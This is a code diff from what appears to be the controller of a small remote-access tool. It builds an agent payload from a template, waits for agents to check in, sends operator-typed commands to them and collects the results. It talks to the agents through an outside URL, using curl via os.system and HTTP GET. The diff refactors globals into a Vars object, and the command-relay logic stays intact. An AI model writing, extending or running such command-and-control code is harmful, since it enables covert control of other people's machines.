@@ -7,9 +7,9 @@ class Vars(object):
 vars = Vars()
 
 def send(text):
-	os.system("echo \"%s\" | curl -F c=@- %s" % (text,url))
+	os.system("echo \"%s\" | curl -F c=@- %s" % (text,vars.url))
 def recv():
-	return requests.get(url).content
+	return requests.get(vars.url).content
 
 def build_payload():
 	return vars.url + open("./template.py","r").read()
@@ -24,11 +24,11 @@ def server_loop():
 
 def handle(msg):
 	if ":" in msg and msg.split(":")[0] == "connect":
-		agent = msg.split(":")[1]
-		print("[%s] is online!" % agent)
+		vars.agent = msg.split(":")[1]
+		print("[%s] is online!" % vars.agent)
 		send("ok")
 	elif msg == "getcmd":
-		cmd = input(agent+"> ")
+		cmd = input(vars.agent+"> ")
 		send("cmd:"+cmd)
 	elif "#" in msg and msg.split("#")[0] == "result":
 		res = msg.split("#")
